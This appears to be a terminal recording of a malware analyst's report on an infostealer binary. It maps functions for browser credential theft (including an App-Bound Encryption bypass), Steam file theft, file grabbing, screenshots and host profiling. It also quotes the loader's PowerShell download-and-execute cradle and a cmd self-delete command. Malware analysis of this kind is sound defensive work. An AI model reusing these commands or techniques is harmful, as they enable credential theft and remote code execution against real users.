[0.016, "o", "\u001b[5;1H\u001b[97m\u001b[1mTask 13 — Browser theft (!129):\u001b(B\u001b[m\u001b[93m stealer_main_payload\u001b[97m @ 0x140029f68 dispatches server-supplied browser descriptors: types 1/2 →\r\n\u001b[93mchromium_collect_creds_and_abe_key\u001b[97m @ 0x14001f100 (type 1 adds the v20 ABE bypass via the Early-Bird APC injector @ 0x14003a048 + embedded IElevator\r\nhelper DLL), type 3 → Gecko handler @ 0x1400225ac (\u001b[93mprofiles.ini\u001b[97m, NSS\u001b[93m PK11SDR_Decrypt\u001b[97m @ 0x14001fa90). Chromium DB files (Cookies/Login Data/Web\r\nData/History slots xref-pinned to FUN_140\u001b[C1b6ac)\u001b[Care stolen\u001b[1m wholesale — no SQL SELECTs exist in the binary\u001b(B\u001b[m\u001b[97m. Output\u001b[93m passwords.txt\u001b[C\u001b[97mwith\u001b[39m              \r\n\u001b[93murl:/login:/password:\u001b[C\u001b[97mlabels.\u001b[39m                                                                                                                 \r\n                                                                                                                                     \r\n\u001b[97m\u001b[1mTask 14 — Wallets/apps (!130):\u001b(B\u001b[m\u001b[97m zero hardcoded wallet/extension/app names — targeting is server-side (\u001b[93mwallets\u001b[97m/\u001b[93mbrowsers\u001b[97m/\u001b[93mplugins\u001b[97m/\u001b[93mfiles\u001b[97m config keys);\r\nhardcoded plumbing:\u001b[93m chrome_extension_\u001b[97m + IndexedDB collection (FUN_14001d7a0).\u001b[1m Steam is the one built-in module\u001b(B\u001b[m\u001b[97m (\u001b[93msteam_steal_ssfn_vdf_module\u001b[97m @\r\n0x140037704: HKCU\u001b[93m Software\\Valve\\Steam\u001b[97m →\u001b[93m SteamPath\u001b[97m →\u001b[93m \\config\\\u001b[97m +\u001b[93m ssfn*,*.vdf\u001b[97m mask list).\u001b[93m steal_outlook\u001b[97m flag exists but its consumer was\u001b[C't pinpointed\r\n(flagged for review). Telegram/Discord/FTP/VPN: no hard\u001b[Coded\u001b[Ctargeting \u001b[Cemonstrated (reachable only via server\u001b[Cgrabber rules).\u001b[39m               \r\n                                                                                                                                                    \r\n\u001b[97m\u001b[1mTask 15 — Grabber/profiling (!131):\u001b(B\u001b[m\u001b[97m server-configured grabber (parser FUN_140025910: masks/start_path/recu\u001b[Csive/m\u001b[Cx_size/csidl; executor\r\n\u001b[93mgrabber_enum_match_collect_files\u001b[97m @ 0x1400082d8, copy-stage-read-delete pattern). Screenshot @ 0x14003a430: GDI+\u001b[1m virtual-screen (multi-monitor)\u001b(B\u001b[m\u001b[97m BitBlt\r\nSRCCOPY|CAPTUREBLT → JPEG (\u001b[93mscreenshot.jpg\u001b[97m). System profiling @ 0x140026dc4: process list, installed apps via Uninstall key ×2 (@ 0x1400385c0),\r\nHWID-from-volume-serial beacon (FUN_140\u001b[C26214).\u001b[39m                                                                                                      \r\n                                                                                                                                              \r\n\u001b[97m\u001b[1mTask 16 — Loader + self-delete (!132):\u001b(B\u001b[m\u001b[97m C\u001b[C\u001b[93m loader\u001b[97m tasking @ 0x140029900 dispatches\u001b[1m EXE\u001b(B\u001b[m\u001b[97m (0x140028978),\u001b[1m PowerShell IEX cradle\u001b(B\u001b[m\u001b[97m (0x140028e58,\u001b[93m -nop -c\r\niex(New-Object Net.WebClient).DownloadString('…')\"\u001b[97m via SysWOW64 powershell.exe), and\u001b[1m MSI\u001b(B\u001b[m\u001b[97m (0x140029224,\u001b[93m msiexec /i … /passive\u001b[97m), each with optional\r\n\u001b[93mrunas\u001b[97m elevation via ShellExecuteExA (identity byte-proven,\u001b[Cslot \u001b[Cx14\u001b[2Cb08d0).\u001b[1m Self-delete @ 0x14003b870 confirmed\u001b(B\u001b[m\u001b[97m:\u001b[93m GetModuleFileNameA\u001b[97m →\u001b[93m cmd.exe /c\r\ntimeout /t 5 &\u001b[Cd\u001b[Cl /f /q \"<own path>\"\u001b[97m via ShellExecuteExA (verb\u001b[C\"\u001b[Cp\u001b[Cn\" byte